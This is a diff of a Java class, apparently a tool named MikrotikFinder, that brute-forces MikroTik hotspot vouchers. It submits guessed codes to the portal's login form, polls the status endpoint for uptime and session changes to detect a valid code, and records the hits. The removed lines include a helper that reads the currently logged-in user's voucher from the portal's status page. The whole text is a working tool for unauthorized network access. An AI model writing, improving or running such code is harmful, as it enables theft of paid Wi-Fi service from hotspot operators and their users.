@@ -154,99 +154,45 @@ public class MikrotikFinder {
         session.setCookie("username", voucher);
         session.setCookie("password", "");
 
+        String beforeJson = httpGet(base + STATUS_PATH, session, 5000);
+        long beforeUptime = parseUptime(getStr(beforeJson, "uptime"));
+        boolean beforeActive = statusActive(beforeJson);
+
         String body = buildFormBody(formTemplate, voucher);
         httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
 
-        try { Thread.sleep(500); } catch (InterruptedException e) { return false; }
-        if (!running.get()) return false;
+        long[] checks = {150, 200, 250, 300, 400, 500, 700, 900};
+        for (long d : checks) {
+            try { Thread.sleep(d); } catch (InterruptedException e) { return false; }
+            if (!running.get()) return false;
 
-        String ourStatus = httpGet(base + STATUS_PATH, session, 4000);
-        if (ourStatus == null) return false;
-        String ourUser = getStr(ourStatus, "username");
-        if (ourUser == null || ourUser.isEmpty() || ourUser.equals("-")) {
-            String htmlUser = readRealUsername(session);
-            if (htmlUser != null && !htmlUser.isEmpty()) ourUser = htmlUser;
-        }
-        if (ourUser == null || !ourUser.equals(voucher)) return false;
+            String afterJson = httpGet(base + STATUS_PATH, session, 4000);
+            if (afterJson == null) continue;
 
-        WorkerSession fresh = new WorkerSession();
-        String freshStatus = httpGet(base + STATUS_PATH, fresh, 5000);
-        String freshUser = getStr(freshStatus, "username");
-        if (freshUser != null && !freshUser.isEmpty() && !freshUser.equals("-") && !freshUser.equals("N/A")) {
-            lastStatusJson = freshStatus;
-            db.addFound(freshUser, freshStatus);
-            currentVoucher = freshUser;
+            String user = getStr(afterJson, "username");
+            long nowUptime = parseUptime(getStr(afterJson, "uptime"));
+            boolean nowActive = statusActive(afterJson);
+
+            boolean signal = false;
+            if (user != null && !user.isEmpty() && !user.equals("-") && user.equals(voucher)) signal = true;
+            if (nowActive && beforeUptime > 30 && nowUptime >= 0 && nowUptime <= FRESH_UPTIME_SECONDS) signal = true;
+            if (nowActive && !beforeActive) signal = true;
+            if (!signal) { emitProgress(""); continue; }
+
+            String realUser = readRealUsername(session);
+            if (realUser != null && !realUser.isEmpty() && !realUser.equals("-") && !realUser.equals("N/A")) {
+                user = realUser;
+            } else if (user == null || user.isEmpty() || user.equals("-")) {
+                user = voucher;
+            }
+
+            lastStatusJson = afterJson;
+            db.addFound(user, afterJson);
+            currentVoucher = user;
             return true;
         }
-
-        if (verifyRealAccess(session)) {
-            lastStatusJson = ourStatus;
-            db.addFound(voucher, ourStatus);
-            currentVoucher = voucher;
-            return true;
-        }
-
-        try { httpGet(base + "/logout", session, 2000); } catch (Exception e) {}
         return false;
-    }
-
-    private boolean verifyRealAccess(WorkerSession session) {
-        if (tryFetch(session, "http://connectivitycheck.gstatic.com/generate_204", 204, null)) return true;
-        if (tryFetch(session, "http://detectportal.firefox.com/success.txt", 200, "success")) return true;
-        if (tryFetch(session, "http://captive.apple.com/hotspot-detect.html", 200, "Success")) return true;
-        if (tryFetch(session, "http://clients3.google.com/generate_204", 204, null)) return true;
-        return false;
-    }
-
-    private boolean tryFetch(WorkerSession session, String urlStr, int expectedCode, String expectedBody) {
-        HttpURLConnection c = null;
-        try {
-            c = (HttpURLConnection) new URL(urlStr).openConnection();
-            c.setConnectTimeout(3000); c.setReadTimeout(3000);
-            c.setInstanceFollowRedirects(false);
-            c.setRequestProperty("User-Agent", session.userAgent);
-            session.applyCookies(c);
-            int code = c.getResponseCode();
-            String body = null;
-            if (expectedBody != null && code == 200) body = readBody(c);
-            c.disconnect(); c = null;
-            if (code != expectedCode) return false;
-            if (expectedBody != null && (body == null || !body.contains(expectedBody))) return false;
-            return true;
-        } catch (Exception e) {
-            return false;
-        } finally { if (c != null) c.disconnect(); }
-    }
-
-    public static String fetchCurrentVoucher(String baseUrl) {
-        HttpURLConnection c = null;
-        try {
-            String b = baseUrl.replaceAll("(?i)/ilogin", "/login").replaceAll("[#?].*", "");
-            if (b.endsWith("/")) b = b.substring(0, b.length()-1);
-            c = (HttpURLConnection) new URL(b + "/status?var=callBack").openConnection();
-            c.setConnectTimeout(5000); c.setReadTimeout(5000);
-            c.setRequestProperty("User-Agent", "Mozilla/5.0");
-            c.setRequestProperty("X-Requested-With", "XMLHttpRequest");
-            int code = c.getResponseCode();
-            if (code < 200 || code >= 300) { c.disconnect(); return null; }
-            StringBuilder sb = new StringBuilder();
-            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(c.getInputStream(), "UTF-8"));
-            String line;
-            while ((line = br.readLine()) != null) { sb.append(line); if (sb.length() > 20000) break; }
-            br.close(); c.disconnect(); c = null;
-            String s = sb.toString();
-            try {
-                org.json.JSONObject o = new org.json.JSONObject(s);
-                String u = o.optString("username", "").trim();
-                if (!u.isEmpty() && !u.equals("-") && !u.equals("N/A")) return u;
-            } catch (Exception ignore) {}
-            java.util.regex.Matcher m = java.util.regex.Pattern.compile("\"username\"\\s*:\\s*\"([^\"]+)\"").matcher(s);
-            if (m.find()) return m.group(1);
-            return null;
-        } catch (Exception e) {
-            return null;
-        } finally { if (c != null) c.disconnect(); }
     }
 
     private String readRealUsername(WorkerSession s) {
